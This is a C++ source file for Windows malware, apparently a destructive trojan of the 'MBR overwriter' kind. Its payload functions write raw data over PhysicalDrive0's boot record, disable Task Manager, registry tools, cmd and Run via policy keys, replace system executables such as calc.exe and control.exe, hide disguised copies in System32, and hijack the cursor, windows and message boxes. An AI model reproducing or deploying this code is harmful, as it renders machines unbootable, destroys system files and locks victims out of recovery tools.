#include "System.h"
#include "Buffer.h"
#include "ImageBuffer.h"

extern "C" NTSTATUS WINAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, BYTE*);

VOID AdjShutdownPriv(VOID) {
	BYTE unused;
	DWORD SHUTDOWN_PRIV = 19;
	RtlAdjustPrivilege(19, 1, 0, &unused);
}

INT pw = GetSystemMetrics(SM_CXSCREEN), ph = GetSystemMetrics(SM_CYSCREEN);

namespace Payloads {
	
	VOID OverwriteMBR(VOID) {
		DWORD dw;
		HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (hDrive == INVALID_HANDLE_VALUE) exit(0);
		WriteFile(hDrive, rawData, 32768, &dw, NULL);
		CloseHandle(hDrive);
	}
	
	VOID SystemToolDisabler(VOID) {
		System::ManageRegW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM", L"DisableTaskmgr", REG_DWORD, 1, NULL, false, false);
		System::ManageRegW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM", L"DisableRegistryTools", REG_DWORD, 1, NULL, false, false);
		System::ManageRegW(HKEY_CURRENT_USER, L"SOFTWARE\\POLICIES\\Microsoft\\Windows\\SYSTEM", L"DisableCmd", REG_DWORD, 1, NULL, false, false);
		System::ManageRegW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\Explorer", L"NoRun", REG_DWORD, 1, NULL, false, false);
	}
	
	DWORD WINAPI CursorPayload(LPVOID pvoid) {
		INT pos = (pw + ph) / 10;
		DOUBLE radius = 0.0;
		while (true) {
			INT lx = pos + cos(radius) * 200, ly = pos + sin(radius) * 200;
			SetCursorPos(lx, ly);
			radius += 0.05;
			mouse_event((rand() % 2) ? (MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP) : (MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP), 0, 0, 0, 0);
			Sleep(10);
		}
	}
	
	DWORD WINAPI WindowPayload(LPVOID pvoid) {
		RECT rect;
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rect);
		while (true) {
			SetWindowPos(hwnd, NULL, rect.left, rect.top, rand() % 30, rand() % 30, SWP_NOSIZE);
			Sleep(10);
		}
	}
	
	DWORD WINAPI UncloseWindows(LPVOID pvoid) {
		while (true) {
			HWND hwnd = GetForegroundWindow();
			HMENU menu = GetSystemMenu(hwnd, false);
			EnableMenuItem(menu, SC_CLOSE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
			SetWindowLongW(hwnd, GWL_STYLE, GetWindowLongW(hwnd, GWL_STYLE) &~WS_MINIMIZEBOX);
			SetWindowLongW(hwnd, GWL_STYLE, GetWindowLongW(hwnd, GWL_STYLE) &~WS_MAXIMIZEBOX);
			Sleep(10);
		}
	}
	
	VOID CopyToSystemFolders(VOID) {
		LPCWSTR pwszPaths[4] = {
			L"C:\\WINDOWS\\System32\\264.dat",
			L"C:\\WINDOWS\\System32\\UNBTRIUM.exe",
			L"C:\\WINDOWS\\Web\\Xorexe.png.exe",
			L"C:\\WINDOWS\\System32\\OOBE\\regerror\\useerror.js.exe"
		};
		for (INT t = 0; t < 4; t++) {
			System::CopyFileExt(GetDir(), pwszPaths[t], FILE_ATTRIBUTE_HIDDEN);
			SetFileAttributesW(GetDir(), FILE_ATTRIBUTE_HIDDEN);
		}
	}
	
	DWORD WINAPI MessageSpam(LPVOID pvoid) {
		while (true) {
			CreateThread(NULL, 0, &System::MsgProc, NULL, 0, 0);
			Sleep(500);
		}
	}
	
	DWORD WINAPI SetStrings(LPVOID pvoid) {
		while (true) {
			HWND hwnd = GetDesktopWindow();
			EnumChildWindows(hwnd, &System::EnumStrProc, 0);
			Sleep(10);
		}
	}
	
	VOID OverwriteFiles(VOID) {
		LPCWSTR pwszFiles[5] = {
			L"C:\\WINDOWS\\System32\\calc.exe",
			L"C:\\WINDOWS\\System32\\runas.exe",
			L"C:\\WINDOWS\\System32\\control.exe",
			L"C:\\WINDOWS\\System32\\logoff.exe",
			L"C:\\WINDOWS\\System32\\winmine.exe"
		};
		for (INT t = 0; t < 5; t++) {
			ReplaceFileW(pwszFiles[t], GetDir(), NULL, REPLACEFILE_IGNORE_MERGE_ERRORS, NULL, NULL);
		}
	}
}

namespace NotWindowsXP {
	VOID WallpaperPayload(VOID) {
		DWORD dw;
		CreateDirectoryW(L"C:\\Leftovers", NULL);
		HANDLE hFile = CreateFileW(L"C:\\Leftovers\\azucar.bmp", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(hFile, Azucar, 372654, &dw, NULL);
		SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (VOID*)L"C:/Leftovers/azucar.bmp", SPIF_SENDWININICHANGE | SPIF_UPDATEINIFILE);
		InvalidateRect(NULL, NULL, FALSE);
	}
}
